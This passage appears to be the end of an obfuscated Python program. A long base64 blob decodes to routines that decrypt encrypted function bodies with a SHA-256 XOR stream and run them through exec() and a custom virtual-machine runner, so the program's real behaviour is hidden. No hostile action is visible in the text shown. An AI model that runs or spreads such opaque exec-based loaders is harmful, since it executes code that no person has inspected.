SEl4b1BacnNndzlHOXRQL1BnQ1JrZlN6dzNoQTlCc0RCTGxxR1dzUWNDRHVRQUdoRFA5YWdXUTVTUVN3RUdnbU9zZXhZUW9lbS92K1dlQUFUSnNNd2laZVlBb1kyWjdSd0pRQmFvUlRDQy9NL3FVc292bTZuNmY2QTllT0pNaWUxMmdyWFFXaENQMlVtYWpIdmhLM0tqTXVDY3o2VXlyRFhIc1RrZC8ra1FKVFF2ZFBJWWIrRDF2ZmNnbExpVGRmOTRSV3ZFWCtxVzN3UktkVnNWaE80bWw3azl1cEd5eHRRd210Z2lWMEM0RkVLSmxHUkwyN2J5eXl6Vkc5NU9NWEREK0Z6TkhHWDE3Mm1rYzl0OTRDM2xIdmNrazlJOHRSRlAvQTV1eGlILzVidDlmTVA5SEx0SFBrNm9aWlI2WWZRZVZsSFpxTU9scmJoSDhwUThRajJobUpTaWhJS3M3U2VJM1BWcytBN1J0eHU1Y3RaOWxEU0pFMVhUOTRmZ1h6N2FwVjJiZTNkVGtoeW50MGExQk9MQzNJa3FOb3lVT1BiN0VUV09aQXVGMHRlbjdxSGVTYlJJQU9BTGM4OENtVk5kMWZVcFRlN1I1MkpGSS8yN0gwTHNxVDUzN2dvMllvdm44STRlaCsydExlNzZWYnBsSE9PSVBKZUhKVnJzTFJ2REZwTTNzNms0R3g4Nkx3YUVwYnM2bENrV3BKeUhrNjRGRnFWOEVLcWI2YzNTZ1haejJkKzdvd1RjTmlzYlJxUVc3dWl6M1hLc3dJS1JqYlNjdk9DVlo2VkhTbTRTQ2xKcmNGeXkyOTB6dHRqb09LaGg3bmkzUERkR0c1ejNLUWN0ZmNqQjdYemt1ZEQrQ3JIVnBkYVVlOUpHckM4Uko0Rzllall3WGExa1NqMWF1RGN1MFZDTnZ2Ly9TUGFnbEVBOVFEc25talpqaGxLajk4a1ZURE9WUjRhQ3RyZkhqMHlBaEdqNzZ4cDFqRUtpN0QrV3BIZWtuSjRZVVh4aE93WENDRlY3TGxCNkRhcFo5S3pIUUJDb2ErdndPbStMbG95V3duQTkvdDdwM2o2ZUwzU2RyU2hJOHdaN3JoYU94L080bVpvMGVSOElWaHFrRno4aTJHRWhqRVN3WE05aEM5OW52R3BiRCtCcnpBZXBKa1lsZkx1eDY2RUNLUy9lVW1hTFErUGdiOVFObFJBZEV6eWZ3VldmdFAzZHFuTDJLazROUUtaemJRV3FVOWloVGFpZzY0ZEJMbnM5bUEyL0RDbXgzUUlGR0I5VzN4dDV4b20raU5peFhQaWJXNnVFc1drSlVzVXZzQ0t3NG50RDhBRHpndlhXMjF3L1dyU0ptT2NpZ0VRemUwMXk0Rk5jK2RNJyldCl9GVU5DX0NBQ0hFID0ge30KCmRlZiBfZXhlY19lbmMoaWR4LCBrZXksIG5hbWUsIGFyZ3MsIGt3YXJncyk6CiAgICBpZiBuYW1lIGluIF9GVU5DX0NBQ0hFOgogICAgICAgIHJldHVybiBfRlVOQ19DQUNIRVtuYW1lXSgqYXJncywgKiprd2FyZ3MpCiAgICByYXcgPSBfRkVOQ19EQVRBW2lkeF0KICAgIG5vbmNlLCB0YWcgPSAocmF3WzoxNl0sIHJhd1stMTY6XSkKICAgIGN0ID0gcmF3WzE2Oi0xNl0KICAgIGF1dGhfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidhdXRodjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgaWYgbm90IGhtYWMuY29tcGFyZV9kaWdlc3QoaGFzaGxpYi5zaGEyNTYoYXV0aF9rZXkgKyBjdCkuZGlnZXN0KClbOjE2XSwgdGFnKToKICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoJ1tmdW5jZW5jXSBpbnRlZ3JpdHkgY2hlY2sgZmFpbGVkJykKICAgIGVuY19rZXkgPSBoYXNobGliLnNoYTI1NihiJ2VuY3YxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIHBsYWluX2J5dGVzID0gX3hvcl9zdHJlYW0oZW5jX2tleSwgY3QpCiAgICBwbGFpbl9zdHIgPSBwbGFpbl9ieXRlcy5kZWNvZGUoJ3V0Zi04JykKICAgIG5zID0ge30KICAgIGV4ZWMocGxhaW5fc3RyLCBnbG9iYWxzKCksIG5zKQogICAgZnVuYyA9IG5zWydfZiddCiAgICBfRlVOQ19DQUNIRVtuYW1lXSA9IGZ1bmMKICAgIHJlc3VsdCA9IGZ1bmMoKmFyZ3MsICoqa3dhcmdzKQogICAgcmV0dXJuIHJlc3VsdAoKYXN5bmMgZGVmIF9leGVjX2VuY19hc3luYyhpZHgsIGtleSwgbmFtZSwgYXJncywga3dhcmdzKToKICAgIGlmIG5hbWUgaW4gX0ZVTkNfQ0FDSEU6CiAgICAgICAgcmV0dXJuIGF3YWl0IF9GVU5DX0NBQ0hFW25hbWVdKCphcmdzLCAqKmt3YXJncykKICAgIHJhdyA9IF9GRU5DX0RBVEFbaWR4XQogICAgbm9uY2UsIHRhZyA9IChyYXdbOjE2XSwgcmF3Wy0xNjpdKQogICAgY3QgPSByYXdbMTY6LTE2XQogICAgYXV0aF9rZXkgPSBoYXNobGliLnNoYTI1NihiJ2F1dGh2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBpZiBub3QgaG1hYy5jb21wYXJlX2RpZ2VzdChoYXNobGliLnNoYTI1NihhdXRoX2tleSArIGN0KS5kaWdlc3QoKVs6MTZdLCB0YWcpOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcignW2Z1bmNlbmNdIGludGVncml0eSBjaGVjayBmYWlsZWQnKQogICAgZW5jX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInZW5jdjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgcGxhaW5fYnl0ZXMgPSBfeG9yX3N0cmVhbShlbmNfa2V5LCBjdCkKICAgIHBsYWluX3N0ciA9IHBsYWluX2J5dGVzLmRlY29kZSgndXRmLTgnKQogICAgbnMgPSB7fQogICAgZXhlYyhwbGFpbl9zdHIsIGdsb2JhbHMoKSwgbnMpCiAgICBmdW5jID0gbnNbJ19mJ10KICAgIF9GVU5DX0NBQ0hFW25hbWVdID0gZnVuYwogICAgcmVzdWx0ID0gYXdhaXQgZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICByZXR1cm4gcmVzdWx0CgpkZWYgX3hvcl9zdHJlYW0oa2V5LCBkYXRhKToKICAgIHJlc3VsdCA9IGJ5dGVhcnJheSgpCiAgICBjb3VudGVyID0gMAogICAgd2hpbGUgbGVuKHJlc3VsdCkgPCBsZW4oZGF0YSk6CiAgICAgICAga3MgPSBoYXNobGliLnNoYTI1NihrZXkgKyBjb3VudGVyLnRvX2J5dGVzKDgsICdiaWcnKSkuZGlnZXN0KCkKICAgICAgICBjaHVuayA9IGRhdGFbbGVuKHJlc3VsdCk6bGVuKHJlc3VsdCkgKyAzMl0KICAgICAgICBmb3IgYSwgYiBpbiB6aXAoY2h1bmssIGtzKToKICAgICAgICAgICAgcmVzdWx0LmFwcGVuZChhIF4gYikKICAgICAgICBjb3VudGVyICs9IDEKICAgIHJldHVybiBieXRlcyhyZXN1bHQpCgpkZWYgX2IoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMCwgX0ZVTkNfS0VZLCAnX2InLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2UoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMSwgX0ZVTkNfS0VZLCAnX2UnLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2YoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMiwgX0ZVTkNfS0VZLCAnX2YnLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2coKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMywgX0ZVTkNfS0VZLCAnX2cnLCBhcmdzLCBrd2FyZ3Mp"), '<exec>', 'exec'), globals())
    _vm_run(_c, _k, _m, globals(), locals(), _map, _ok, _ht, _pf)
if __name__ == '__main__':
    _joivy()
